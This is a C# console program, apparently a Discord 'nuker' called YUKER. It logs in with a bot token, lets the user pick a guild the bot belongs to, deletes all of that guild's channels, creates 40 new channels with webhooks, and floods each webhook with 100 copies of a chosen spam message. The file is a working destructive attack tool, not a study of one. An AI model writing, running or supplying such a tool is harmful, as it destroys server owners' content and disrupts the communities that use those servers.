
class Program
{

  public static readonly Int32 MESSAGES_PER_WEBHOOK = 100;
  public static readonly Int32 CHANNELS_TO_CREATE = 40;

  public static async Task Main()
  {
    try
    {
      await Init();
    }
    catch (System.Exception ex)
    {
      Console.WriteLine(ex.Message);
      Exit();
    }
  }

  public static async Task Init()
  {
    Console.Title = "YUKER";
    Console.Clear();
    Console.Write("[?] Please enter your Discord Bot Token: ");

    String? token = Console.ReadLine();

    if (token == null)
    {
      Console.WriteLine("[!] Discord Bot Token was not entered");
      Exit();
      return;
    }

    DiscordBotUser? user = await Discord.GetInfo(token);

    if (user == null)
    {
      Console.WriteLine("[!] The entered token is invalid or unauthorized.");
      Exit();
      return;
    }

    Console.WriteLine($"[!] Successfully logged in as {user.username}#{user.discriminator} (ID: {user.id})");
    Console.Title = $"YUKER - Logged in as {user.username}";

    Console.WriteLine("[!] Retrieving bot's guilds ...");
    List<DiscordGuild>? guilds = await Discord.GetGuilds(token);

    if (guilds == null || guilds.Count <= 0)
    {
      Console.WriteLine("[!] The bot is not a member of any guilds.");
      Exit();
      return;
    }
    Console.WriteLine("[!] The bot is a member of the following guilds:");
    foreach (var (guild, index) in guilds.Select((guild, index) => (guild, index)))
    {
      Console.WriteLine($"[{index}] >> {guild.name} ({guild.id}) - Admin: {Util.BotIsAdmin(guild.permissions)}");
    }

    Console.Write("[?] Please enter the Guild ID from the list above: ");
    String? guildId = Console.ReadLine();

    if (guildId == null || guilds.Find(x => x.id == guildId) == null)
    {
      Console.WriteLine("[!] Invalid Guild ID entered or the bot is not a member of the specified guild.");
      Exit();
      return;
    }

    Console.Write("[?] Please enter the message you want to spam: ");
    String? content = Console.ReadLine();

    if (content == null || content.Length <= 0 || content.Length >= 2000)
    {
      Console.WriteLine("[!] Message content is missing or exceeds the maximum length of 2000 characters.");
      Exit();
      return;
    }

    List<DiscordChannel>? channels = await Discord.GetChannels(token, guildId);

    List<Task> deleteTasks = [];

    if (channels != null && channels.Count >= 1)
    {
      foreach (DiscordChannel channelToDelete in channels)
      {
        deleteTasks.Add(Task.Run(async delegate
       {
         if (channelToDelete.id != null)
         {
           await Discord.DeleteChannel(token, channelToDelete.id);
         }
       }));
      }
      await Task.WhenAll(deleteTasks);
    }
    else
    {
      Console.WriteLine("[!] No available channels were found in the selected guild to delete (Skipping)");
    }

    List<DiscordWebhook> webhooks = [];

    await Task.Delay(5000);


    for (int i = 0; i < CHANNELS_TO_CREATE; i++)
    {
      await Task.Run(async delegate
      {
        DiscordChannel? new_channel = await Discord.CreateChannel(token, guildId);
        if (new_channel != null && new_channel.id != null)
        {
          await Discord.CreateWebhookForChannel(token, new_channel.id, webhooks);
        }
      });
    }

    await Task.Delay(5000);

    foreach (DiscordWebhook webhook in webhooks)
    {
      if (webhook != null && webhook.url != null)
      {
        _ = Task.Run(async delegate
      {
        for (int i = 0; i < MESSAGES_PER_WEBHOOK; i++)
        {
          await Discord.SendMessageToWebhook(webhook.url, content);
        }
      });
      }
    }

    Console.ReadLine();
  }



  public static void Exit()
  {
    Console.WriteLine("\n[!] Exiting Program in 5 seconds ...");
    Thread.Sleep(5000);
    Environment.Exit(0);
  }
}